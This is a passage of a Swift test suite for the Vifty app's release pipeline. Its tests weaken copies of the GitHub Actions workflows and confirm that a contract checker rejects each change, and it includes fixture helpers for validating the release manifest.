                    with: #"test "${GITHUB_REF}" = "refs/heads/main""#
                )
        }

        let result = try fixture.runChecker()

        XCTAssertNotEqual(result.exitCode, 0)
        XCTAssertTrue(
            result.stderr.contains(
                "prepare-candidate must fail closed outside the first attempt of an exact immutable signed-tag push"
            ),
            result.stderr
        )
    }

    func testWorkflowContractRejectsMissingFirstAttemptJobGates() throws {
        let fixture = try WorkflowContractFixture(repositoryRoot: repositoryRoot)
        try fixture.mutateReleaseWorkflow { workflow in
            workflow
                .replacingOccurrences(
                    of: "    if: ${{ github.run_attempt == 1 }}\n    runs-on: macos-15",
                    with: "    runs-on: macos-15"
                )
                .replacingOccurrences(
                    of: "    if: ${{ github.run_attempt == 1 }}\n    runs-on: ubuntu-latest",
                    with: "    runs-on: ubuntu-latest"
                )
        }

        let result = try fixture.runChecker()

        XCTAssertNotEqual(result.exitCode, 0)
        XCTAssertTrue(result.stderr.contains("sign-notarize must refuse workflow reruns"), result.stderr)
        XCTAssertTrue(result.stderr.contains("publish must refuse workflow reruns"), result.stderr)
    }

    func testWorkflowContractRejectsMutableCheckoutRef() throws {
        let fixture = try WorkflowContractFixture(repositoryRoot: repositoryRoot)
        try fixture.mutateReleaseWorkflow { workflow in
            workflow.replacingOccurrences(
                    of: "ref: refs/tags/${{ github.ref_name }}",
                    with: "ref: main"
                )
        }

        let result = try fixture.runChecker()

        XCTAssertNotEqual(result.exitCode, 0)
        XCTAssertTrue(
            result.stderr.contains(
                "prepare-candidate checkout must bind the exact immutable pushed tag with full history and no persisted credentials"
            ),
            result.stderr
        )
    }

    func testWorkflowContractRejectsCandidateOnlyProtectedProvenance() throws {
        let fixture = try WorkflowContractFixture(repositoryRoot: repositoryRoot)
        try fixture.mutateReleaseWorkflow { workflow in
            workflow.replacingOccurrences(
                of: "\"${TRUSTED_ROOT}/scripts/check-release-provenance.sh\"",
                with: "bash scripts/check-release-provenance.sh"
            )
        }

        let result = try fixture.runChecker()

        XCTAssertNotEqual(result.exitCode, 0)
        XCTAssertTrue(result.stderr.contains("rerun trusted github.sha provenance before secret-consuming steps"), result.stderr)
    }

    func testWorkflowContractRejectsOrdinaryBashForProtectedReleaseEntrypoint() throws {
        let fixture = try WorkflowContractFixture(repositoryRoot: repositoryRoot)
        try fixture.mutateReleaseWorkflow { workflow in
            workflow.replacingOccurrences(
                of: "\"${TRUSTED_ROOT}/scripts/check-release-environment.sh\"",
                with: "bash \"${TRUSTED_ROOT}/scripts/check-release-environment.sh\""
            )
        }

        let result = try fixture.runChecker()

        XCTAssertNotEqual(result.exitCode, 0)
        XCTAssertTrue(
            result.stderr.contains(
                "execute protected release entrypoints directly so their privileged-shell shebang cannot be bypassed"
            ),
            result.stderr
        )
    }

    func testWorkflowContractRejectsPublicationContractWithoutExactTagObjectBinding() throws {
        let fixture = try WorkflowContractFixture(repositoryRoot: repositoryRoot)
        try fixture.mutateReleaseWorkflow { workflow in
            workflow.replacingOccurrences(
                of: "\"tagObjectSHA\" => provenance.fetch(\"tagObjectSHA\")",
                with: "\"tagObjectSHA\" => provenance.fetch(\"checkoutCommitSHA\")"
            )
        }

        let result = try fixture.runChecker()

        XCTAssertNotEqual(result.exitCode, 0)
        XCTAssertTrue(
            result.stderr.contains("bind final annotated-tag identity"),
            result.stderr
        )
    }

    func testWorkflowContractRejectsMissingTrustedManifestHistoryBaseChecks() throws {
        let fixture = try WorkflowContractFixture(repositoryRoot: repositoryRoot)
        try fixture.mutateCIWorkflow { workflow in
            workflow.replacingOccurrences(
                of: "scripts/check-release-manifest.sh",
                with: "scripts/removed-release-manifest-check.sh"
            )
        }

        let result = try fixture.runChecker()

        XCTAssertNotEqual(result.exitCode, 0)
        XCTAssertTrue(result.stderr.contains("trusted base release-manifest continuity"), result.stderr)
    }

    func testWorkflowContractRejectsPublishWithoutSummaryTagSourceKindAndManifestBinding() throws {
        for clause in [
            "data[\"releaseTag\"] == contract.fetch(\"releaseTag\")",
            "data[\"releaseSourceCommit\"] == contract.fetch(\"tagCommitSHA\")",
            "data[\"releaseManifestEntryKind\"] == \"candidate\"",
            "data[\"releaseManifestSHA256\"] == contract.fetch(\"releaseManifestSHA256\")"
        ] {
            let fixture = try WorkflowContractFixture(repositoryRoot: repositoryRoot)
            try fixture.mutateReleaseWorkflow { workflow in
                workflow.replacingOccurrences(of: clause, with: "true # removed summary cross-job binding")
            }

            let result = try fixture.runChecker()

            XCTAssertNotEqual(result.exitCode, 0, "removing \(clause) must fail")
            XCTAssertTrue(
                result.stderr.contains("publish must bind verifier summary tag/source/kind/manifest to peeled pushed-tag contract"),
                result.stderr
            )
        }
    }

    func testWorkflowContractRejectsPublishWithoutRemoteTagIdentityReadback() throws {
        let fixture = try WorkflowContractFixture(repositoryRoot: repositoryRoot)
        try fixture.mutateReleaseWorkflow { workflow in
            workflow.replacingOccurrences(
                of: #"verify_remote_tag_identity "${TAG_OBJECT_SHA}" "${TAG_COMMIT_SHA}""#,
                with: "true # removed remote tag identity readback"
            )
        }

        let result = try fixture.runChecker()

        XCTAssertNotEqual(result.exitCode, 0)
        XCTAssertTrue(
            result.stderr.contains("REST-create the marked draft") ||
                result.stderr.contains("reviewed normalized step mapping hash"),
            result.stderr
        )
    }

    func testWorkflowContractRejectsMissingPublicTagRuleCoveragePrerequisite() throws {
        let fixture = try WorkflowContractFixture(repositoryRoot: repositoryRoot)
        try fixture.mutateReleaseWorkflow { workflow in
            workflow.replacingOccurrences(
                of: "\"publicTagRuleCoverageVerified\" => true",
                with: "\"publicTagRuleCoverageVerified\" => false"
            )
        }

        let result = try fixture.runChecker()

        XCTAssertNotEqual(result.exitCode, 0)
        XCTAssertTrue(
            result.stderr.contains("honest public update/deletion ruleset evidence") ||
                result.stderr.contains("semantic ruleset evidence"),
            result.stderr
        )
    }

    func testWorkflowContractRejectsMissingSignedAdministratorGovernanceBinding() throws {
        let fixture = try WorkflowContractFixture(repositoryRoot: repositoryRoot)
        try fixture.mutateReleaseWorkflow { workflow in
            workflow.replacingOccurrences(
                of: "\"administratorGovernanceVerified\" => true",
                with: "\"administratorGovernanceVerified\" => false"
            )
        }

        let result = try fixture.runChecker()

        XCTAssertNotEqual(result.exitCode, 0)
        XCTAssertTrue(
            result.stderr.contains("signed administrator-pretag evidence") ||
                result.stderr.contains("reviewed normalized step mapping hash"),
            result.stderr
        )
    }

    func testWorkflowContractRejectsRulesetCheckWithoutDeletionProtection() throws {
        let fixture = try WorkflowContractFixture(repositoryRoot: repositoryRoot)
        try fixture.mutateReleaseWorkflow { workflow in
            workflow.replacingOccurrences(
                of: "rule_types.include?(\"update\") && rule_types.include?(\"deletion\")",
                with: "rule_types.include?(\"update\")"
            )
        }

        let result = try fixture.runChecker()

        XCTAssertNotEqual(result.exitCode, 0)
        XCTAssertTrue(
            result.stderr.contains("public update/deletion tag-rule coverage"),
            result.stderr
        )
    }

    func testWorkflowContractRejectsPromotionWithoutCapturedImmutableReleaseID() throws {
        let fixture = try WorkflowContractFixture(repositoryRoot: repositoryRoot)
        try fixture.mutateReleaseWorkflow { workflow in
            workflow.replacingOccurrences(
                of: "RELEASE_ID=\"$(capture_owned_draft_release_id \"${CREATE_RESPONSE}\")\"",
                with: "RELEASE_ID=\"123\""
            )
        }

        let result = try fixture.runChecker()

        XCTAssertNotEqual(result.exitCode, 0)
        XCTAssertTrue(
            result.stderr.contains("capture its immutable ID directly"),
            result.stderr
        )
    }

    func testWorkflowContractRejectsMarkerBlindAmbiguousDraftDiscovery() throws {
        let fixture = try WorkflowContractFixture(repositoryRoot: repositoryRoot)
        try fixture.mutateReleaseWorkflow { workflow in
            workflow.replacingOccurrences(
                of: "body.scan(Regexp.escape(marker)).length == 1",
                with: "body.include?(marker)"
            )
        }

        let result = try fixture.runChecker()

        XCTAssertNotEqual(result.exitCode, 0)
        XCTAssertTrue(
            result.stderr.contains("exact immutable-ID/tag/draft/title/marker ownership proof"),
            result.stderr
        )
    }

    func testWorkflowContractRejectsAssetUploadAddressedByTag() throws {
        let fixture = try WorkflowContractFixture(repositoryRoot: repositoryRoot)
        try fixture.mutateReleaseWorkflow { workflow in
            workflow.replacingOccurrences(
                of: "https://uploads.github.com/repos/${GITHUB_REPOSITORY}/releases/${RELEASE_ID}/assets?${query}",
                with: "https://uploads.github.com/repos/${GITHUB_REPOSITORY}/releases/${RELEASE_TAG}/assets?${query}"
            )
        }

        let result = try fixture.runChecker()

        XCTAssertNotEqual(result.exitCode, 0)
        XCTAssertTrue(
            result.stderr.contains("upload every asset through the captured release ID"),
            result.stderr
        )
    }

    func testWorkflowContractRejectsTagBasedReleaseMutation() throws {
        let fixture = try WorkflowContractFixture(repositoryRoot: repositoryRoot)
        try fixture.mutateReleaseWorkflow { workflow in
            workflow.replacingOccurrences(
                of: "          CONTAINMENT_REQUIRED=0",
                with: "          gh release edit \"${RELEASE_TAG}\" --draft=false\n          CONTAINMENT_REQUIRED=0"
            )
        }

        let result = try fixture.runChecker()

        XCTAssertNotEqual(result.exitCode, 0)
        XCTAssertTrue(
            result.stderr.contains("forbid tag-based release mutation"),
            result.stderr
        )
    }

    func testWorkflowContractRejectsIgnoredContainmentMutationFailure() throws {
        let fixture = try WorkflowContractFixture(repositoryRoot: repositoryRoot)
        try fixture.mutateReleaseWorkflow { workflow in
            workflow.replacingOccurrences(
                of: "-F draft=true > \"${containment_response}\"; then",
                with: "-F draft=true > \"${containment_response}\" || true; then"
            )
        }

        let result = try fixture.runChecker()

        XCTAssertNotEqual(result.exitCode, 0)
        XCTAssertTrue(
            result.stderr.contains("hard-fail unless containment readback succeeds"),
            result.stderr
        )
    }

    func testWorkflowContractRejectsHardcodedPublishIdentity() throws {
        let fixture = try WorkflowContractFixture(repositoryRoot: repositoryRoot)
        try fixture.mutateReleaseWorkflow { workflow in
            workflow.replacingOccurrences(
                of: "            data = JSON.parse(File.read(ARGV.fetch(0)))\n            contract = JSON.parse(File.read(ARGV.fetch(4)))",
                with: "            data = JSON.parse(File.read(ARGV.fetch(0)))\n            hardcoded_team = \"X88J3853S2\"\n            contract = JSON.parse(File.read(ARGV.fetch(4)))"
            )
        }

        let result = try fixture.runChecker()

        XCTAssertNotEqual(result.exitCode, 0)
        XCTAssertTrue(result.stderr.contains("must not hardcode manifest identity literal X88J3853S2"), result.stderr)
    }

    func testCaskDeclaresArm64OnlyArchitecture() throws {
        let cask = try String(
            contentsOf: repositoryRoot.appendingPathComponent("Casks/vifty.rb"),
            encoding: .utf8
        )

        XCTAssertTrue(cask.contains("depends_on arch: :arm64"))
    }

    private func readJSON(_ url: URL) throws -> [String: Any] {
        let data = try Data(contentsOf: url)
        return try XCTUnwrap(JSONSerialization.jsonObject(with: data) as? [String: Any])
    }

    private func publishedEntry(
        basedOn base: [String: Any],
        version: String,
        build: Int,
        sourceCommit: String
    ) -> [String: Any] {
        var release = base
        release["version"] = version
        release["build"] = build
        release["tag"] = "v\(version)"
        release["sourceCommit"] = sourceCommit
        release["artifact"] = "Vifty-v\(version).zip"
        release["checksumAsset"] = "Vifty-v\(version).zip.sha256"
        release["artifactSummary"] = "Vifty-v\(version)-artifact-summary.json"
        release["releaseChecklist"] = "Vifty-v\(version)-release-checklist.md"
        release["sha256"] = String(repeating: "c", count: 64)
        release["tagTrust"] = "signed-verified"
        release["installedReleaseReview"] = "pending"
        release["manualCompatibility"] = "pending"
        release["manualCompatibilityScope"] = NSNull()
        return release
    }

    private func candidateEntry(version: String, build: Int) -> [String: Any] {
        [
            "version": version,
            "build": build,
            "tag": "v\(version)",
            "artifact": "Vifty-v\(version).zip",
            "checksumAsset": "Vifty-v\(version).zip.sha256",
            "artifactSummary": "Vifty-v\(version)-artifact-summary.json",
            "releaseChecklist": "Vifty-v\(version)-release-checklist.md",
            "sha256": NSNull(),
            "artifactTrust": "pending",
            "signingTrust": "pending",
            "tagTrust": "signed-required",
            "installedReleaseReview": "pending",
            "manualCompatibility": "pending",
            "manualCompatibilityScope": NSNull()
        ]
    }

    private func run(
        _ executable: URL,
        arguments: [String],
        environment: [String: String] = [:]
    ) throws -> ReleaseManifestProcessResult {
        let process = Process()
        process.executableURL = executable
        process.arguments = arguments
        process.environment = ProcessInfo.processInfo.environment.merging(
            environment,
            uniquingKeysWith: { _, new in new }
        )

        let stdout = Pipe()
        let stderr = Pipe()
        process.standardOutput = stdout
        process.standardError = stderr

        try process.run()
        process.waitUntilExit()

        return ReleaseManifestProcessResult(
            stdout: String(decoding: stdout.fileHandleForReading.readDataToEndOfFile(), as: UTF8.self),
            stderr: String(decoding: stderr.fileHandleForReading.readDataToEndOfFile(), as: UTF8.self),
            exitCode: process.terminationStatus
        )
    }
}

private final class WorkflowContractFixture {
    let rootURL: URL
    private let repositoryRoot: URL

    init(repositoryRoot: URL) throws {
        self.repositoryRoot = repositoryRoot
        rootURL = FileManager.default.temporaryDirectory
            .appendingPathComponent("vifty-workflow-contract-\(UUID().uuidString)", isDirectory: true)
        try FileManager.default.createDirectory(
            at: rootURL.appendingPathComponent(".github/workflows", isDirectory: true),
            withIntermediateDirectories: true
        )
        try FileManager.default.createDirectory(
            at: rootURL.appendingPathComponent("scripts", isDirectory: true),
            withIntermediateDirectories: true
        )
        for workflow in ["ci.yml", "release.yml"] {
            try FileManager.default.copyItem(
                at: repositoryRoot.appendingPathComponent(".github/workflows/\(workflow)"),
                to: rootURL.appendingPathComponent(".github/workflows/\(workflow)")
            )
        }
        try FileManager.default.copyItem(
            at: repositoryRoot.appendingPathComponent("scripts/run-actionlint.sh"),
            to: rootURL.appendingPathComponent("scripts/run-actionlint.sh")
        )
        try FileManager.default.copyItem(
            at: repositoryRoot.appendingPathComponent("scripts/check-release-secrets.sh"),
            to: rootURL.appendingPathComponent("scripts/check-release-secrets.sh")
        )
        try FileManager.default.copyItem(
            at: repositoryRoot.appendingPathComponent("scripts/check-release-environment.sh"),
            to: rootURL.appendingPathComponent("scripts/check-release-environment.sh")
        )
        try FileManager.default.copyItem(
            at: repositoryRoot.appendingPathComponent("scripts/check-release-governance.sh"),
            to: rootURL.appendingPathComponent("scripts/check-release-governance.sh")
        )
        for script in [
            "check-release-prep-diff.sh",
            "check-release-provenance.sh",
            "create-signed-release-tag.sh",
            "push-and-dispatch-signed-release-tag.sh",
            "release-candidate-inventory.rb",
            "write-release-checklist.sh",
            "validate-release-governance-evidence.rb",
            "verify-release-gh-toolchain.rb"
        ] {
            try FileManager.default.copyItem(
                at: repositoryRoot.appendingPathComponent("scripts/\(script)"),
                to: rootURL.appendingPathComponent("scripts/\(script)")
            )
        }
        try FileManager.default.copyItem(
            at: repositoryRoot.appendingPathComponent(".github/release-gh-toolchain.json"),
            to: rootURL.appendingPathComponent(".github/release-gh-toolchain.json")
        )
    }

    deinit {
        try? FileManager.default.removeItem(at: rootURL)
    }

    func mutateReleaseWorkflow(_ mutation: (String) -> String) throws {
        let url = rootURL.appendingPathComponent(".github/workflows/release.yml")
        let original = try String(contentsOf: url, encoding: .utf8)
        let updated = mutation(original)
        XCTAssertNotEqual(updated, original, "workflow fixture mutation did not match its marker")
        try updated.write(to: url, atomically: true, encoding: .utf8)
    }

    func mutateCIWorkflow(_ mutation: (String) -> String) throws {
        let url = rootURL.appendingPathComponent(".github/workflows/ci.yml")
        let original = try String(contentsOf: url, encoding: .utf8)
        let updated = mutation(original)
        XCTAssertNotEqual(updated, original, "workflow fixture mutation did not match its marker")
        try updated.write(to: url, atomically: true, encoding: .utf8)
    }

    func mutateReleaseSecretChecker(_ mutation: (String) -> String) throws {
        let url = rootURL.appendingPathComponent("scripts/check-release-secrets.sh")
        let original = try String(contentsOf: url, encoding: .utf8)
        let updated = mutation(original)
        XCTAssertNotEqual(updated, original, "release-secret fixture mutation did not match its marker")
        try updated.write(to: url, atomically: true, encoding: .utf8)
    }

    func mutateReleaseGovernanceChecker(_ mutation: (String) -> String) throws {
        let url = rootURL.appendingPathComponent("scripts/check-release-governance.sh")
        let original = try String(contentsOf: url, encoding: .utf8)
        let updated = mutation(original)
        XCTAssertNotEqual(updated, original, "release-governance fixture mutation did not match its marker")
        try updated.write(to: url, atomically: true, encoding: .utf8)
    }

    func mutatePushDispatchHelper(_ mutation: (String) -> String) throws {
        let url = rootURL.appendingPathComponent(
            "scripts/push-and-dispatch-signed-release-tag.sh"
        )
        let original = try String(contentsOf: url, encoding: .utf8)
        let updated = mutation(original)
        XCTAssertNotEqual(updated, original, "push-dispatch fixture mutation did not match its marker")
        try updated.write(to: url, atomically: true, encoding: .utf8)
    }

    func runChecker() throws -> ReleaseManifestProcessResult {
        let process = Process()
        process.executableURL = URL(fileURLWithPath: "/usr/bin/ruby")
        process.arguments = [repositoryRoot.appendingPathComponent("scripts/check-workflow-contract.rb").path]
        process.environment = ProcessInfo.processInfo.environment.merging(
            ["VIFTY_WORKFLOW_CONTRACT_ROOT": rootURL.path],
            uniquingKeysWith: { _, new in new }
        )

        let stdout = Pipe()
        let stderr = Pipe()
        process.standardOutput = stdout
        process.standardError = stderr
        try process.run()
        process.waitUntilExit()

        return ReleaseManifestProcessResult(
            stdout: String(decoding: stdout.fileHandleForReading.readDataToEndOfFile(), as: UTF8.self),
            stderr: String(decoding: stderr.fileHandleForReading.readDataToEndOfFile(), as: UTF8.self),
            exitCode: process.terminationStatus
        )
    }
}

private struct ReleaseManifestProcessResult {
    let stdout: String
    let stderr: String
    let exitCode: Int32
}

private final class ReleaseManifestFixture {
    let rootURL: URL
    private let repositoryRoot: URL
    private let baseManifestURL: URL

    init(repositoryRoot: URL) throws {
        self.repositoryRoot = repositoryRoot
        rootURL = FileManager.default.temporaryDirectory
            .appendingPathComponent("vifty-release-manifest-\(UUID().uuidString)", isDirectory: true)
        try FileManager.default.createDirectory(
            at: rootURL.appendingPathComponent(".github", isDirectory: true),
            withIntermediateDirectories: true
        )
        try FileManager.default.createDirectory(
            at: rootURL.appendingPathComponent("docs/schemas", isDirectory: true),
            withIntermediateDirectories: true
        )
        try FileManager.default.copyItem(
            at: repositoryRoot.appendingPathComponent(".github/release-manifest.json"),
            to: rootURL.appendingPathComponent(".github/release-manifest.json")
        )
        baseManifestURL = rootURL.appendingPathComponent("base-release-manifest.json")
        let repositoryManifest = try XCTUnwrap(
            JSONSerialization.jsonObject(
                with: Data(
                    contentsOf: repositoryRoot
                        .appendingPathComponent(".github/release-manifest.json")
                )
            ) as? [String: Any]
        )
        var fixtureManifest = repositoryManifest
        let currentPublished = try XCTUnwrap(
            repositoryManifest["publishedRelease"] as? [String: Any]
        )
        let historical = try XCTUnwrap(
            repositoryManifest["historicalReleases"] as? [[String: Any]]
        )
        let grandfatheredPublished = if currentPublished["version"] as? String == "1.3.2" {
            currentPublished
        } else {
            try XCTUnwrap(
                historical.first { $0["version"] as? String == "1.3.2" },
                "release-manifest fixtures require the immutable v1.3.2 boundary"
            )
        }
        fixtureManifest["historicalReleases"] = []
        fixtureManifest["publishedRelease"] = grandfatheredPublished
        fixtureManifest["candidate"] = NSNull()
        let fixtureData = try JSONSerialization.data(
            withJSONObject: fixtureManifest,
            options: [.prettyPrinted, .sortedKeys]
        )
        try fixtureData.write(
            to: rootURL.appendingPathComponent(".github/release-manifest.json")
        )
        try fixtureData.write(to: baseManifestURL)
        try FileManager.default.copyItem(
            at: repositoryRoot.appendingPathComponent("docs/schemas/release-manifest.schema.json"),
            to: rootURL.appendingPathComponent("docs/schemas/release-manifest.schema.json")
        )
    }

    func mutateManifest(_ mutation: (inout [String: Any]) throws -> Void) throws {
        let url = rootURL.appendingPathComponent(".github/release-manifest.json")
        var manifest = try XCTUnwrap(
            JSONSerialization.jsonObject(with: Data(contentsOf: url)) as? [String: Any]
        )
        try mutation(&manifest)
        let data = try JSONSerialization.data(withJSONObject: manifest, options: [.prettyPrinted, .sortedKeys])
        try data.write(to: url)
    }

    func promoteCurrentManifest(version: String, build: Int) throws {
        try mutateManifest { manifest in
            let previous = try XCTUnwrap(manifest["publishedRelease"] as? [String: Any])
            manifest["historicalReleases"] = [previous]
            var current = previous
            current["version"] = version
            current["build"] = build
            current["tag"] = "v\(version)"
            current["sourceCommit"] = String(repeating: "b", count: 40)
            current["artifact"] = "Vifty-v\(version).zip"
            current["checksumAsset"] = "Vifty-v\(version).zip.sha256"
            current["artifactSummary"] = "Vifty-v\(version)-artifact-summary.json"
            current["releaseChecklist"] = "Vifty-v\(version)-release-checklist.md"
            current["sha256"] = String(repeating: "c", count: 64)
            current["tagTrust"] = "signed-verified"
            current["manualCompatibility"] = "pending"
            current["manualCompatibilityScope"] = NSNull()
            manifest["publishedRelease"] = current
        }
    }

    func snapshotCurrentAsBase() throws {
        let currentURL = rootURL.appendingPathComponent(".github/release-manifest.json")
        try FileManager.default.removeItem(at: baseManifestURL)
        try FileManager.default.copyItem(at: currentURL, to: baseManifestURL)
    }

    func runHistoryChecker() throws -> ReleaseManifestProcessResult {
        try runHistoryChecker(arguments: [
            "--current", rootURL.appendingPathComponent(".github/release-manifest.json").path,
            "--base", baseManifestURL.path
        ])
    }

    func runHistoryCheckerWithoutBase() throws -> ReleaseManifestProcessResult {
        try runHistoryChecker(arguments: [
            "--current", rootURL.appendingPathComponent(".github/release-manifest.json").path,
            "--allow-initial-v1.3.2"
        ])
    }

    private func runHistoryChecker(arguments: [String]) throws -> ReleaseManifestProcessResult {
        let process = Process()
        process.executableURL = URL(fileURLWithPath: "/usr/bin/ruby")
        process.arguments = [repositoryRoot.appendingPathComponent("scripts/check-release-manifest-history.rb").path] + arguments
        let stdout = Pipe()
        let stderr = Pipe()
        process.standardOutput = stdout
        process.standardError = stderr
        try process.run()
        process.waitUntilExit()
        return ReleaseManifestProcessResult(
            stdout: String(decoding: stdout.fileHandleForReading.readDataToEndOfFile(), as: UTF8.self),
            stderr: String(decoding: stderr.fileHandleForReading.readDataToEndOfFile(), as: UTF8.self),
            exitCode: process.terminationStatus
        )
    }

    func runChecker() throws -> ReleaseManifestProcessResult {
        let process = Process()
        process.executableURL = repositoryRoot.appendingPathComponent("scripts/check-release-manifest.sh")
        process.arguments = ["--manifest-only"]
        process.environment = ProcessInfo.processInfo.environment.merging(
            ["VIFTY_RELEASE_MANIFEST_ROOT": rootURL.path],
            uniquingKeysWith: { _, new in new }
        )

        let stdout = Pipe()
        let stderr = Pipe()
        process.standardOutput = stdout
        process.standardError = stderr

        try process.run()
        process.waitUntilExit()

        return ReleaseManifestProcessResult(
            stdout: String(decoding: stdout.fileHandleForReading.readDataToEndOfFile(), as: UTF8.self),
            stderr: String(decoding: stderr.fileHandleForReading.readDataToEndOfFile(), as: UTF8.self),
            exitCode: process.terminationStatus
        )
    }
}
